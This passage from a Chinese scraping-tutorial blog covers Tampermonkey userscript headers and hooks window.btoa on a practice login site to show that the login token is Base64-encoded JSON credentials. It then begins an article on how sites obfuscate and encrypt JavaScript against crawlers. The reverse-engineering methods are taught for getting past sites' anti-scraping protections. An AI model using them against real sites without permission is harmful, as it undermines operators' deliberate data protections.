                      <p><code>@homepage</code>、 <code>@homepageURL</code>、 <code>@website</code>、<code>@source</code>：作者主页，用于在 Tampermonkey 选项页面上从脚本名称点击跳转。请注意，如果 <code>@namespace</code> 标记以 <code>http://</code>开头，此处也要一样。</p>
                    </li>
                    <li>
                      <p><code>@icon</code>、 <code>@iconURL</code> 、<code>@defaulticon</code>：低分辨率图标。</p>
                    </li>
                    <li>
                      <p><code>@icon64</code> 、 <code>@icon64URL</code>：64 × 64 高分辨率图标。</p>
                    </li>
                    <li>
                      <p><code>@updateURL</code>：检查更新的网址，需要定义 <code>@version</code>。</p>
                    </li>
                    <li>
                      <p><code>@downloadURL</code>：更新下载脚本的网址，如果定义成 <code>none</code> 就不会检查更新。</p>
                    </li>
                    <li>
                      <p><code>@supportURL</code>：报告问题的网址。</p>
                    </li>
                    <li>
                      <p><code>@include</code>：生效页面，可以配置多个，但注意这里并不支持 URL Hash。</p>
                      <p>例如：</p>
                      <figure class="highlight jboss-cli">
                        <table>
                          <tr>
                            <td class="gutter">
                              <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre>
                            </td>
                            <td class="code">
                              <pre><span class="line"><span class="string">//</span> @include http:<span class="string">//www.tampermonkey.net/</span>*</span><br><span class="line"><span class="string">//</span> @include http:<span class="string">//</span>*</span><br><span class="line"><span class="string">//</span> @include https:<span class="string">//</span>*</span><br><span class="line"><span class="string">//</span> @include *</span><br></pre>
                            </td>
                          </tr>
                        </table>
                      </figure>
                    </li>
                    <li>
                      <p><code>@match</code>：约等于 <code>@include</code> 标签，可以配置多个。</p>
                    </li>
                    <li>
                      <p><code>@exclude</code>：不生效页面，可配置多个，优先级高于 <code>@include</code> 和 <code>@match</code>。</p>
                    </li>
                    <li>
                      <p><code>@require</code>：附加脚本网址，相当于引入外部的脚本，这些脚本会在自定义脚本执行之前执行，比如引入一些必须的库，如 jQuery 等，这里可以支持配置多个 <code>@require</code> 参数。</p>
                      <p>例如：</p>
                      <figure class="highlight vim">
                        <table>
                          <tr>
                            <td class="gutter">
                              <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre>
                            </td>
                            <td class="code">
                              <pre><span class="line">// @require http<span class="variable">s:</span>//code.jquery.<span class="keyword">com</span>/jquery-<span class="number">2.1</span>.<span class="number">4</span>.<span class="built_in">min</span>.js</span><br><span class="line">// @require http<span class="variable">s:</span>//code.jquery.<span class="keyword">com</span>/jquery-<span class="number">2.1</span>.<span class="number">3</span>.<span class="built_in">min</span>.js#sha256=<span class="number">23456</span>...</span><br><span class="line">// @require http<span class="variable">s:</span>//code.jquery.<span class="keyword">com</span>/jquery-<span class="number">2.1</span>.<span class="number">2</span>.<span class="built_in">min</span>.js#md5=<span class="number">34567</span>...,<span class="built_in">sha256</span>=<span class="number">6789</span>...</span><br></pre>
                            </td>
                          </tr>
                        </table>
                      </figure>
                    </li>
                    <li>
                      <p><code>@resource</code>：预加载资源，可通过 <code>GM_getResourceURL</code> 和 <code>GM_getResourceText</code> 读取。</p>
                    </li>
                    <li>
                      <p><code>@connect</code>：允许被 <code>GM_xmlhttpRequest</code> 访问的域名，每行 1 个。</p>
                    </li>
                    <li>
                      <p><code>@run-at</code>：脚本注入的时刻，如页面刚加载时，某个事件发生后等。</p>
                      <ul>
                        <li><code>document-start</code>：尽可能地早执行此脚本。</li>
                        <li><code>document-body</code>：DOM 的 body 出现时执行。</li>
                        <li><code>document-end</code>：<code>DOMContentLoaded</code> 事件发生时或发生后执行。</li>
                        <li><code>document-idle</code>：<code>DOMContentLoaded</code> 事件发生后执行，即 DOM 加载完成之后执行，这是默认的选项。</li>
                        <li><code>context-menu</code>：如果在浏览器上下文菜单（仅限桌面 Chrome 浏览器）中点击该脚本，则会注入该脚本。注意：如果使用此值，则将忽略所有 <code>@include</code> 和 <code>@exclude</code> 语句。</li>
                      </ul>
                    </li>
                    <li>
                      <p><code>@grant</code>：用于添加 GM 函数到白名单，相当于授权某些 GM 函数的使用权限。</p>
                      <p>例如：</p>
                      <figure class="highlight pgsql">
                        <table>
                          <tr>
                            <td class="gutter">
                              <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>
                            </td>
                            <td class="code">
                              <pre><span class="line">// @<span class="keyword">grant</span> GM_setValue</span><br><span class="line">// @<span class="keyword">grant</span> GM_getValue</span><br><span class="line">// @<span class="keyword">grant</span> GM_setClipboard</span><br><span class="line">// @<span class="keyword">grant</span> unsafeWindow</span><br><span class="line">// @<span class="keyword">grant</span> <span class="keyword">window</span>.<span class="keyword">close</span></span><br><span class="line">// @<span class="keyword">grant</span> <span class="keyword">window</span>.focus</span><br></pre>
                            </td>
                          </tr>
                        </table>
                      </figure>
                      <p>如果没有定义过 <code>@grant</code> 选项，Tampermonkey 会猜测所需要的函数使用情况。</p>
                    </li>
                    <li>
                      <p><code>@noframes</code>：此标记使脚本在主页面上运行，但不会在 iframe 上运行。</p>
                    </li>
                    <li>
                      <p><code>@nocompat</code>：由于部分代码可能是为专门的浏览器所写，通过此标记，Tampermonkey 会知道脚本可以运行的浏览器。</p>
                      <p>例如：</p>
                      <figure class="highlight 1c">
                        <table>
                          <tr>
                            <td class="gutter">
                              <pre><span class="line">1</span><br></pre>
                            </td>
                            <td class="code">
                              <pre><span class="line"><span class="comment">// @nocompat Chrome</span></span><br></pre>
                            </td>
                          </tr>
                        </table>
                      </figure>
                      <p>这样就指定了脚本只在 Chrome 浏览器中运行。</p>
                    </li>
                  </ul>
                  <p>除此之外，Tampermonkey 还定义了一些 API，使得我们可以方便地完成某个操作。</p>
                  <ul>
                    <li><code>GM_log</code>：将日志输出到控制台。</li>
                    <li><code>GM_setValue</code>：将参数内容保存到 Storage 中。</li>
                    <li><code>GM_addValueChangeListener</code>：为某个变量添加监听，当这个变量的值改变时，就会触发回调。</li>
                    <li><code>GM_xmlhttpRequest</code>：发起 Ajax 请求。</li>
                    <li><code>GM_download</code>：下载某个文件到磁盘。</li>
                    <li><code>GM_setClipboard</code>：将某个内容保存到粘贴板。</li>
                  </ul>
                  <p>还有很多其他的 API，大家可以到 <a href="https://www.tampermonkey.net/documentation.php" target="_blank" rel="noopener">https://www.tampermonkey.net/documentation.php</a> 查看更多的内容。</p>
                  <p>在 <code>UserScript Header</code> 下方是 JavaScript 函数和调用的代码，其中 <code>&#39;use strict&#39;</code> 标明代码使用 JavaScript 的严格模式。在严格模式下，可以消除 Javascript 语法的一些不合理、不严谨之处，减少一些怪异行为，如不能直接使用未声明的变量，这样可以保证代码的运行安全，同时提高编译器的效率，提高运行速度。在下方 <code>// Your code here...</code> 处就可以编写自己的代码了。</p>
                  <h2 id="6-实战分析"><a href="#6-实战分析" class="headerlink" title="6. 实战分析"></a>6. 实战分析</h2>
                  <p>下面我们通过一个简单的 JavaScript 逆向案例来演示一下如何实现 JavaScript 的 Hook 操作，轻松找到某个方法执行的位置，从而快速定位逆向入口。</p>
                  <p>接下来我们来看一个简单的网站：<a href="https://login1.scrape.center/，这个网站的结构非常简单，就是一个用户名密码登录。但是不同的是，点击登录的时候，表单提交" target="_blank" rel="noopener">https://login1.scrape.center/，这个网站的结构非常简单，就是一个用户名密码登录。但是不同的是，点击登录的时候，表单提交</a> POST 的内容并不是单纯的用户名和密码，而是一个加密后的 token。</p>
                  <p>页面如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/h09sh.png" alt="image-20210509215948819"></p>
                  <p>我们输入用户名密码，都为 admin，点击登录按钮，观察一下网络请求的变化。</p>
                  <p>可以看到如下结果如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/neccv.png" alt="image-20210509220046359"></p>
                  <p>我们不需要关心 Response 的结果和状态，主要看 Request 的内容就好了。</p>
                  <p>可以看到，点击登录按钮时，发起了了一个 POST 请求，内容为：</p>
                  <figure class="highlight python">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">&#123;<span class="string">"token"</span>:<span class="string">"eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiJhZG1pbiJ9"</span>&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>嗯，确实，没有诸如 <code>username</code> 和 <code>password</code> 的内容了，那怎么模拟登录呢？</p>
                  <p>模拟登录的前提当然就是找到当前 token 生成的逻辑了，那么问题来了，到底这个 token 和用户名、密码是什么关系呢？我们怎么来找寻其中的蛛丝马迹呢？</p>
                  <p>这里我们就可能思考了，本身输入的是用户名和密码，但提交的时候却变成了一个 token，经过观察并结合一些经验可以看出，token 的内容非常像 Base64 编码。这就代表，网站可能首先将用户名密码混为了一个新的字符串，然后经过了一次 Base64 编码，最后将其赋值为 token 来提交了。所以，初步观察我们可以得出这么多信息。</p>
                  <p>好，那就来验证一下吧！探究网站 JavaScript 代码里面是如何实现的。</p>
                  <p>首先我们看一下网站的源码，打开 Sources 面板，看起来都是 Webpack 打包之后的内容，经过了一些混淆，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/ztakd.png" alt="image-20210509222556397"></p>
                  <p>这么多混淆代码，总不能一点点扒着看吧？那么遇到这种情形，这怎么去找 token 的生成位置呢？</p>
                  <p>解决方法其实有两种，一种就是前文所讲的 Ajax 断点，另一种就是 Hook。</p>
                  <h3 id="Ajax-断点"><a href="#Ajax-断点" class="headerlink" title="Ajax 断点"></a>Ajax 断点</h3>
                  <p>由于这个请求正好是一个 Ajax 请求，所以我们可以添加一个 XHR 断点监听，把 POST 的网址加到断点监听上面。在 Sources 面板右侧添加一个 XHR 断点，匹配内容就填当前域名就好了，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/icog3.png" alt="image-20210509223127936"></p>
                  <p>这时候如果我们再次点击登录按钮，发起一次 Ajax 请求，就可以进入断点了，然后再看堆栈信息，就可以一步步找到编码的入口了。</p>
                  <p>再次点击登录按钮，页面就进入断点状态停下来了，结果如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/dz078.png" alt="image-20210509223337762"></p>
                  <p>一步步找，最后可以找到入口其实是在 <code>onSubmit</code> 方法那里。但实际上我们观察到，这里的断点的栈顶还包括了一些类似 async Promise 等无关的内容，而我们真正想找的是用户名和密码经过处理，再进行 Base64 编码的地方，这些请求的调用实际上和我们找寻的入口没有很大的关系。</p>
                  <p>另外，如果我们想找的入口位置并不伴随这一次 Ajax 请求，这个方法就没法用了。</p>
                  <p>所以下面我们再来看另一个方法 —— Hook。</p>
                  <h3 id="Hook-Function"><a href="#Hook-Function" class="headerlink" title="Hook Function"></a>Hook Function</h3>
                  <p>所以这里介绍第二种可以快速定位入口的方法，那就是使用 Tampermonkey 自定义 JavaScript，实现某个 JavaScript 方法的 Hook。Hook 哪里呢？很明显，Hook Base64 编码的位置就好了。</p>
                  <p>那么这里就涉及一个小知识点：JavaScript 里面的 Base64 编码是怎么实现的？</p>
                  <p>没错，就是 <code>btoa</code> 方法，在 JavaScript 中该方法用于将字符串编码成 Base64 字符串，因此我们来 Hook <code>btoa</code> 方法就好了。</p>
                  <p>好，这里我们新建一个 Tampermonkey 脚本，内容如下：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         HookBase64</span></span><br><span class="line"><span class="comment">// @namespace    https://login1.scrape.center/</span></span><br><span class="line"><span class="comment">// @version      0.1</span></span><br><span class="line"><span class="comment">// @description  Hook Base64 encode function</span></span><br><span class="line"><span class="comment">// @author       Germey</span></span><br><span class="line"><span class="comment">// @match        https://login1.scrape.center/</span></span><br><span class="line"><span class="comment">// @grant        none</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">  "use strict"</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">hook</span>(<span class="params">object, attr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> func = object[attr];</span><br><span class="line">    object[attr] = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">"hooked"</span>, object, attr);</span><br><span class="line">      <span class="keyword">var</span> ret = func.apply(object, <span class="built_in">arguments</span>);</span><br><span class="line">      <span class="keyword">debugger</span>;</span><br><span class="line">      <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  hook(<span class="built_in">window</span>, <span class="string">"btoa"</span>);</span><br><span class="line">&#125;)();</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>首先我们定义了一些 <code>UserScript Header</code>，包括 <code>@name</code>和<code>@match</code>等，这里比较重要的就是<code>@name</code>，表示脚本名称；另外一个就是 <code>@match</code>，它代表脚本生效的网址。</p>
                  <p>脚本的内容如上面代码所示。我们定义了一个 <code>hook</code>方法，传入 <code>object</code> 和 <code>attr</code> 参数，意思就是 Hook <code>object</code> 对象的 <code>attr</code>参数。例如我们如果想 Hook <code>alert</code> 方法，那就把 <code>object</code> 设置为 <code>window</code>，把 <code>attr</code> 设置为字符串 <code>alert</code> 。这里我们想要 Hook Base64 的编码方法，而在 JavaScript 中，Based64 编码是用 <code>btoa</code> 方法实现的，所以这里我们就只需要 Hook <code>window</code> 对象的 <code>btoa</code> 方法就好了。</p>
                  <p>那么 Hook 是怎么实现的呢？我们来看已下，首先一句 <code>var func = object[attr]</code>，相当于我们先把它赋值为一个变量，我们调用 <code>func</code> 方法就可以实现和原来相同的功能。接着，我们直接改写这个方法的定义，将 <code>object[attr]</code> 改写成一个新的方法，在新的方法中，通过 <code>func.apply</code> 方法又重新调用了原来的方法。这样我们就可以保证前后方法的执行效果是不受什么影响的，之前这个方法该干啥就还是干啥。</p>
                  <p>但是和之前不同的是，我们自定义方法之后，现在可以在 <code>func</code> 方法执行的前后，再加入自己的代码，如 <code>console.log</code> 将信息输出到控制台，<code>debugger</code> 进入断点等。在这个过程中，我们先临时保存下来了 <code>func</code> 方法，然后定义一个新的方法，接管程序控制权，在其中自定义我们想要的实现，同时在新的方法里面重新调回 <code>func</code> 方法，保证前后结果是不受影响的。所以，我们达到了在不影响原有方法效果的前提下，实现在方法前后自定义的功能，这就是 Hook 的过程。</p>
                  <p>最后，我们调用 <code>hook</code> 方法，传入 <code>window</code> 对象和 <code>btoa</code> 字符串，保存。</p>
                  <p>接下来刷新下页面，这时候我们就可以看到这个脚本在当前页面生效了，可以发现 Tempermonkey 插件面板提示了已经启用，同时在 Sources 面板下的 Page 选项卡可以观察到我们定义的 JavaScript 脚本被执行了，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/acsk0.png" alt="image-20210509223942108"></p>
                  <p>然后输入用户名、密码，点击提交，成功进入了断点模式停下来了，代码就卡在了我们自定义的 <code>debugger</code> 这一行代码的位置，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/n0or9.png" alt="image-20210509224216857"></p>
                  <p>成功 Hook 住了，这说明 JavaScript 代码在执行过程中调用到了 <code>btoa</code> 方法。</p>
                  <p>这时看一下控制台，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/ev1me.png" alt="image-20210509224328452"></p>
                  <p>这里也输出了 <code>window</code> 对象和 <code>btoa</code> 方法，验证正确。</p>
                  <p>这样，我们就顺利找到了 Base64 编码操作这个路口，然后看一下堆栈信息，也已经不会出现 async、Promise 这样的调用了，很清晰地呈现了 <code>btoa</code> 方法逐层调用的过程，非常清晰明了，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/17rng.png" alt="image-20210509224356222"></p>
                  <p>另外再观察下 Local 面板，看看 <code>arguments</code> 变量是怎样的，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/0wuj4.png" alt="image-20210509224448758"></p>
                  <p>可以说一目了然了，<code>arguments</code> 就是指传给 <code>btoa</code> 方法的参数，<code>ret</code> 就是 <code>btoa</code> 方法返回的结果，可以看到 <code>arguments</code> 就是 <code>username</code> 和 <code>password</code> 通过 JSON 序列化之后的字符串，经过 Base64 编码之后得到的值恰好就是 Ajax 请求参数 <code>token</code> 的值。</p>
                  <p>结果几乎也明了了，我们还可以通过调用栈找到 <code>onSubmit</code> 方法的处理源码：</p>
                  <figure class="highlight javascript">
                    <table>
                      <tr>
                        <td class="gutter">
                          <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                        </td>
                        <td class="code">
                          <pre><span class="line">onSubmit: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> e = c.encode(<span class="built_in">JSON</span>.stringify(<span class="keyword">this</span>.form));</span><br><span class="line">  <span class="keyword">this</span>.$http.post(a[<span class="string">"a"</span>].state.url.root, &#123;</span><br><span class="line">    token: e</span><br><span class="line">  &#125;).then((<span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span><br><span class="line">  	<span class="built_in">console</span>.log(<span class="string">"data"</span>, e)</span><br><span class="line">  &#125;))</span><br><span class="line">&#125;</span><br></pre>
                        </td>
                      </tr>
                    </table>
                  </figure>
                  <p>仔细看看，<code>encode</code> 方法其实就是调用了一下 <code>btoa</code>方法，就是一个 Base64 编码的过程，答案其实已经很明了了。</p>
                  <p>当然我们还可以进一步打断点验证一下流程，比如在调用 <code>encode</code> 方法的一行打断点，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/94afz.png" alt="image-20210509224938312"></p>
                  <p>打完断点之后，可以点击 Resume 按钮恢复 JavaScript 的执行，跳过当前 Tempermonkey 定义的断点位置，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/wif60.png" alt="image-20210509225049534"></p>
                  <p>然后重新再点击登录按钮，可以看到这时候就停在了当前打断点的位置了，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/db9n7.png" alt="image-20210509225531743"></p>
                  <p>这时候可以在 Watch 面板下输入 <code>this.form</code>，验证此处是否为在表单中输入的用户名密码，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/vn5bl.png" alt="image-20210509225732574"></p>
                  <p>没问题，然后逐步调试。我们还可以可以观察到，下一步就跳到了我们 Hook 的位置，这说明调用了 <code>btoa</code> 方法，如图所示。</p>
                  <p><img src="https://cdn.cuiqingcai.com/jvx5f.png" alt="image-20210509225907721"></p>
                  <p>返回的结果正好就是 token 的值。</p>
                  <p>所以，验证到这里，已经非常清晰了，整体逻辑就是对登录表单的用户名和密码进行了 JSON 序列化，然后调用了 <code>encode</code> 也就是 <code>btoa</code> 方法，并赋值为了 <code>token</code> 发起登录的 Ajax 请求，逆向完成。</p>
                  <p>我们通过 Tampermonkey 自定义 JavaScript 脚本的方式，实现了某个方法调用的 Hook，使得我们能快速定位到加密入口的位置，非常方便。</p>
                  <p>以后如果观察出一些门道，可以多使用这种方法来尝试，如 Hook <code>encode</code> 方法、<code>decode</code>方法、<code>stringify</code> 方法、<code>log</code> 方法、<code>alert</code> 方法等，简单又高效。</p>
                  <h2 id="7-总结"><a href="#7-总结" class="headerlink" title="7. 总结"></a>7. 总结</h2>
                  <p>以上便是通过 Tampermonkey 实现简单 Hook 的基础操作，当然这仅仅是一个常见的基础案例，我们可以从中总结出一些 Hook 的基本门道。</p>
                  <p>由于本节涉及到一些专有名词，部分内容参考如下：</p>
                  <ul>
                    <li>博客 - Hook 技术：<a href="https://www.jianshu.com/p/3382cc765b39" target="_blank" rel="noopener">https://www.jianshu.com/p/3382cc765b39</a>。</li>
                    <li>官网 - Tampermonkey 官网：<a href="http://www.tampermonkey.net/" target="_blank" rel="noopener">http://www.tampermonkey.net/</a></li>
                    <li>文档 - Base64 编码：<a href="https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/btoa" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/btoa</a></li>
                  </ul>
                  </p>
                </div>
              </div>
              <div class="post-meta">
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-user"></i>
                  </span>
                  <span class="post-meta-item-text">作者</span>
                  <span><a href="/authors/崔庆才" class="author" itemprop="url" rel="index">崔庆才</a></span>
                </span>
                <span class="post-meta-item">
                  <span class="post-meta-item-icon">
                    <i class="far fa-calendar"></i>
                  </span>
                  <span class="post-meta-item-text">发表于</span>
                  <time title="创建时间：2022-03-11 15:33:52" itemprop="dateCreated datePublished" datetime="2022-03-11T15:33:52+08:00">2022-03-11</time>
                </span>
                <span id="/2022113.html" class="post-meta-item leancloud_visitors" data-flag-title="【2022 年】Python3 爬虫教程 - JavaScript Hook 的用法" title="阅读次数">
                  <span class="post-meta-item-icon">
                    <i class="fa fa-eye"></i>
                  </span>
                  <span class="post-meta-item-text">阅读次数：</span>
                  <span class="leancloud-visitors-count"></span>
                </span>
                <span class="post-meta-item" title="本文字数">
                  <span class="post-meta-item-icon">
                    <i class="far fa-file-word"></i>
                  </span>
                  <span class="post-meta-item-text">本文字数：</span>
                  <span>8.6k</span>
                </span>
                <span class="post-meta-item" title="阅读时长">
                  <span class="post-meta-item-icon">
                    <i class="far fa-clock"></i>
                  </span>
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                  <span>8 分钟</span>
                </span>
              </div>
            </article>
            <article itemscope itemtype="http://schema.org/Article" class="post-block index" lang="zh-CN">
              <link itemprop="mainEntityOfPage" href="https://cuiqingcai.com/2022111.html">
              <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
                <meta itemprop="image" content="/images/avatar.png">
                <meta itemprop="name" content="崔庆才">
                <meta itemprop="description" content="静觅丨崔庆才的个人站点专业为您提供爬虫教程,爬虫,Python,Python爬虫,Python爬虫教程,爬虫书的相关信息，想要了解更多详情，请联系我们。">
              </span>
              <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
                <meta itemprop="name" content="静觅">
              </span>
              <header class="post-header">
                <h2 class="post-title" itemprop="name headline">
                  <a class="label"> Python <i class="label-arrow"></i>
                  </a>
                  <a href="/2022111.html" class="post-title-link" itemprop="url">【2022 年】Python3 爬虫教程 - JavaScript 网站加密和混淆技术简介</a>
                </h2>
              </header>
              <div class="post-body" itemprop="articleBody">
                <div class="thumb">
                  <img itemprop="contentUrl" class="random">
                </div>
                <div class="excerpt">
                  <p>
                  <blockquote>
                    <p>系列文章总目录：<a href="https://cuiqingcai.com/17777.html">【2022 年】Python3 爬虫学习教程</a>，本教程内容多数来自于《Python3 网络爬虫开发实战（第二版）》一书，目前截止 2022 年，可以将爬虫基本技术进行系统讲解，同时将最新前沿爬虫技术如异步、JavaScript 逆向、AST、安卓逆向、Hook、智能解析、群控技术、WebAssembly、大规模分布式、Docker、Kubernetes 等，市面上目前就仅有<a href="https://item.jd.com/13527222.html" target="_blank" rel="noopener">《Python3 网络爬虫开发实战（第二版）》</a>一书了，<a href="https://item.jd.com/13527222.html" target="_blank" rel="noopener">点击了解详情</a>。</p>
                  </blockquote>
                  <p>随着大数据时代的发展，各个公司的数据保护意识越来越强，大家都在想尽办法保护自家产品的数据不轻易被爬虫爬走。由于网页是提供信息和服务的重要载体，所以对网页上的信息进行保护就成了至关重要的一个环节。</p>
                  <p>网页是运行在浏览器端的，当我们浏览一个网页时，其 HTML 代码、 JavaScript 代码都会被下载到浏览器中执行。借助浏览器的开发者工具，我们可以看到网页在加载过程中所有网络请求的详细信息，也能清楚地看到网站运行的 HTML 代码和 JavaScript 代码，这些代码中就包含了网站加载的全部逻辑，如加载哪些资源、请求接口是如何构造的、页面是如何渲染的等等。正因为代码是完全透明的，所以如果我们能够把其中的执行逻辑研究出来，就可以模拟各个网络请求进行数据爬取了。</p>
                  <p>然而，事情没有想象得那么简单。随着前端技术的发展，前端代码的打包技术、混淆技术、加密技术也层出不穷，借助于这些技术，各个公司可以在前端对 JavaScript 代码采取一定的保护，比如变量名混淆、执行逻辑混淆、反调试、核心逻辑加密等，这些保护手段使得我们没法很轻易地找出 JavaScript 代码中包含的的执行逻辑。</p>
                  <p>在前几章的案例中，我们也试着爬取了各种形式的网站。其中有的网站的数据接口是没有任何验证或加密参数的，我们可以轻松模拟并爬取其中的数据；但有的网站稍显复杂，网站的接口中增加了一些加密参数，同时对 JavaScript 代码采取了上文所述的一些防护措施，当时我们没有直接尝试去破解，而是用 Selenium 等类似工具来实现模拟浏览器执行的方式来进行“所见即所得“的爬取。其实对于后者，我们还有另外一种解决方案，那就是直接逆向 JavaScript 代码，找出其中的加密逻辑，从而直接实现该加密逻辑来进行爬取。如果加密逻辑实在过于复杂，我们也可以找出一些关键入口，从而实现对加密逻辑的单独模拟执行和数据爬取。这些方案难度可能很大，比如关键入口很难寻找，或者加密逻辑难以模拟，可是一旦成功找到突破口，我们便可以不用借助于 Selenium 等工具进行整页数据的渲染而实现数据爬取，这样爬取效率会大幅提升。</p>
                  <p>本章我们首先会对 JavaScript 防护技术进行介绍，然后介绍一些常用的 JavaScript 逆向技巧，包括浏览器工具的使用、Hook 技术、AST 技术、特殊混淆技术的处理、WebAssembly 技术的处理。了解了这些技术，我们可以更从容地应对 JavaScript 防护技术。</p>
                  <h2 id="1-引入"><a href="#1-引入" class="headerlink" title="1. 引入"></a>1. 引入</h2>
                  <p>我们在爬取网站的时候，会遇到一些情况需要分析一些接口或 URL 信息，在这个过程中，我们会遇到各种各样类似加密的情形，比如说：</p>
                  <ul>
                    <li>某个网站的 URL 带有一些看不太懂的长串加密参数，要抓取就必须要懂得这些参数是怎么构造的，否则我们连完整的 URL 都构造不出来，更不用说爬取了。</li>
                    <li>分析某个网站的 Ajax 接口的时候，可以看到接口的一些参数也是加密的，或者 Request Headers 里面也可能带有一些加密参数，如果不知道这些参数的具体构造逻辑就没法直接用程序来模拟这些 Ajax 请求。</li>
                    <li>翻看网站的 JavaScript 源代码，可以发现很多压缩了或者看不太懂的字符，比如 JavaScript 文件名被编码，JavaScript 的文件内容都压缩成几行，JavaScript 变量也被修改成单个字符或者一些十六进制的字符，导致我们不好轻易根据 JavaScript 找出某些接口的加密逻辑。</li>
                  </ul>
                  <p>这些情况呢，基本上都是网站为了保护其本身的一些数据不被轻易抓取而采取的一些措施，我们可以把它归类为两大类：</p>
                  <ul>
                    <li>URL/API 参数加密</li>
                    <li>JavaScript 压缩、混淆和加密</li>
                  </ul>
                  <p>这一节我们就来了解下这两类技术的基本原理和一些常见的示例。知己知彼，百战不殆，了解了这些技术的实现原理之后，我们才能更好地去逆向其中的逻辑，从而实现数据爬取。</p>
                  <h2 id="2-网站数据防护方案"><a href="#2-网站数据防护方案" class="headerlink" title="2. 网站数据防护方案"></a>2. 网站数据防护方案</h2>
                  <p>当今大数据时代，数据已经变得越来越重要，网页和 App 现在是主流的数据载体，如果其数据的 API 没有设置任何保护措施，在爬虫工程师解决了一些基本的反爬如封 IP、验证码的问题之后，那么数据还是可以被轻松爬取到的。</p>
                  <p>那么，有没有可能在 URL/API 层面或 JavaScript 层面也加上一层防护呢？答案是可以。</p>
                  <h3 id="URL-API-参数加密"><a href="#URL-API-参数加密" class="headerlink" title="URL/API 参数加密"></a>URL/API 参数加密</h3>
                  <p>网站运营者首先想到防护措施可能是对某些数据接口的参数进行加密，比如说对某些 URL 的一些参数加上校验码或者把一些 id 信息进行编码，使其变得难以阅读或构造；或者对某些 API 请求加上一些 token、sign 等签名，这样这些请求发送到服务器时，服务器会通过客户端发来的一些请求信息以及双方约定好的秘钥等来对当前的请求进行校验，如果校验通过，才返回对应数据结果。</p>
                  <p>比如说客户端和服务端约定一种接口校验逻辑，客户端在每次请求服务端接口的时候都会附带一个 sign 参数，这个 sign 参数可能是由当前时间信息、请求的 URL、请求的数据、设备的 ID、双方约定好的秘钥经过一些加密算法构造而成的，客户端会实现这个加密算法构造 sign，然后每次请求服务器的时候附带上这个参数。服务端会根据约定好的算法和请求的数据对 sign 进行校验，如果校验通过，才返回对应的数据，否则拒绝响应。</p>
                  <p>当然登录状态的校验也可以看作是此类方案，比如一个 API 的调用必须要传一个 token，这个 token 必须用户登录之后才能获取，如果请求的时候不带该 token，API 就不会返回任何数据。</p>
                  <p>倘若没有这种措施，那么基本上 URL 或者 API 接口是完全公开可以访问的，这意味着任何人都可以直接调用来获取数据，几乎是零防护的状态，这样是非常危险的，而且数据也可以被轻易地被爬虫爬取。因此对 URL/API 参数一些加密和校验是非常有必要的。</p>
                  <h3 id="JavaScript-压缩、混淆和加密"><a href="#JavaScript-压缩、混淆和加密" class="headerlink" title="JavaScript 压缩、混淆和加密"></a>JavaScript 压缩、混淆和加密</h3>
                  <p>接口加密技术看起来的确是一个不错的解决方案，但单纯依靠它并不能很好地解决问题。为什么呢？</p>
                  <p>对于网页来说，其逻辑是依赖于 JavaScript 来实现的，JavaScript 有如下特点：</p>
                  <ul>
